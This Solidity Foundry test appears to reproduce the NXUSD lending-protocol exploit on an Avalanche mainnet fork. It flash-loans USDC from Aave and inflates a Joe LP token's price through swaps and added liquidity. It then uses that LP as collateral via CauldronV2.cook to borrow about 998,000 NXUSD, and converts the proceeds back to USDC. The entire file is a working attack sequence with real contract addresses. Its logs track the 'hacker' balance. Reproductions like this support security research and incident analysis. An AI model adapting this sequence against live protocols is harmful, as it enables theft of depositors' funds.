pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "forge-std/console.sol";

contract ContractTest is DSTest {
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664); //Avalanche Bridge USDC.e
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IUSDC USDC = IUSDC(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 NXUSD = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);

    ICurvePool CrvPool = ICurvePool(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);
    ICurvePool plainPool = ICurvePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
    address private metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D; // NXUSD3CRV MetaPool

    ILendingPool aaveLendingPool =
        ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    IPancakeRouter JoeRouter02 = IPancakeRouter(payable(0x60aE616a2155Ee3d9A68541Ba4544862310933d4));
    IPancakePair JoePair = IPancakePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
    INXUSD CauldronV2 = INXUSD(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);//  NXUSD protocol
    IDegenBox private DegenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);

    address[] private _assets = [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E]; //usdc
    uint256[] private _amounts = [51000000000000];
    uint256[] private _modes = [0];

    uint8[] private actions = [5, 21, 20, 10];
    uint256[] private values = [0, 0, 0, 0];

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/avalanche", 19613451); // fork mainnet at block 19613453
    }

    function testExploit() public {
        console.log(" enter testExploit()  ");
        aaveLendingPool.flashLoan(
            address(this),
            _assets,
            _amounts,
            _modes,
            address(this),
            new bytes(1),
            0
        ); // flashloan USDC
        emit log_named_uint(
            "After exploit repaid, profit in USDC of attacker:",
            USDC.balanceOf(address(this)) / 1e6
        );
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {
        assets;
        amounts;
        premiums;
        params;
        initiator;

        console.log(
            "Before swap()  USDC balance of  hacker ",
            USDC.balanceOf(address(this)) / 1e6
        );

        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WAVAX);

        USDC.approve(address(JoeRouter02), type(uint256).max);
        JoeRouter02.swapExactTokensForTokens(
            280000000000,
            10000000000000000000000,
            path,
            address(this),
            block.timestamp + 60
        );
        console.log(
            "Aftr swap() WAVAX  balance of  hacker  ",
            WAVAX.balanceOf(address(this)) / 1e18
        );

        WAVAX.approve(address(JoeRouter02), type(uint256).max);
        JoeRouter02.addLiquidity(
            address(USDC),
            address(WAVAX),
            260000000000,
            500000000000000000000000,
            250000000000,
            0,
            address(this),
            block.timestamp + 120
        );
        emit log_named_decimal_uint(
            "Aftr addLiquidity() JoeLp  balance of  hacker ",
            JoePair.balanceOf(address(this)),
            18
        );
        JoeRouter02.swapExactTokensForTokens(
            USDC.balanceOf(address(this)),
            50000000000000000000000,
            path,
            address(this),
            block.timestamp + 60
        );

        emit log_named_uint(
            "After swap,WAVAX balance of attacker:",
            WAVAX.balanceOf(address(this))
        );
        NXUSD.approve(address(CrvPool), type(uint256).max);
        JoePair.approve(address(DegenBox), type(uint256).max);
        USDC_e.approve(address(JoeRouter02), type(uint256).max);

        address masterContract = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
        DegenBox.setMasterContractApproval(
            address(this),
            masterContract,
            true,
            0,
            0,
            0
        );
        //---------------------cook start---------------------------------
        int256 borrowAmounts = 998000 * 1e18;
        int256 share = 0;
        bytes[] memory datas = new bytes[](4);
        datas[0] = abi.encode(borrowAmounts, address(this)); //borrow
        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts, share); //withdraw
        datas[2] = abi.encode(JoePair, address(this), 45330977931305070, share); //deposit
        datas[3] = abi.encode(-2, address(this), false); // Collateral enter market
        //emit log_bytes(datas[3]);
        CauldronV2.updateExchangeRate();
        CauldronV2.cook(actions, values, datas);
        console.log(
            "After cook  NXUSD balance of  hacker",
            NXUSD.balanceOf(address(this))/1e18
        );

        //---------------------cook end---------------------------------

        path[0] = address(WAVAX);
        path[1] = address(USDC);
        JoeRouter02.swapExactTokensForTokens(
            WAVAX.balanceOf(address(this)),
            33000000000000,
            path,
            address(this),
            block.timestamp + 60
        );
        console.log(
            "After swap  USDC balance of hacker",
            USDC.balanceOf(address(this))
        );

        CrvPool.exchange_underlying(
            metaPool,
            0,
            2,
            998000 * 1e18,
            950000000000
        );
        console.log(
            "After exchange  USDC.e balance of hacker",
            USDC_e.balanceOf(address(this)) / 1e6
        );

        //--------------------------USDC.e swap USDC--------------------------------------
        USDC_e.approve(address(plainPool), type(uint256).max);

        // 1 :USDC.e ------> USDC
        plainPool.exchange(0, 1, 800000 * 1e6, 700000 * 1e6);

        // 2 :USDC.e ------> USDC
        path[0] = address(USDC_e);
        path[1] = address(USDC);
        JoeRouter02.swapExactTokensForTokens(
            USDC_e.balanceOf(address(this)),
            120000000000,
            path,
            address(this),
            block.timestamp + 60
        );

        console.log(
            "Before repay flashloan USDC balance of  hacker",
            USDC.balanceOf(address(this)) / 1e6
        );
        USDC.approve(address(aaveLendingPool), type(uint256).max);

        return true;
    }
}
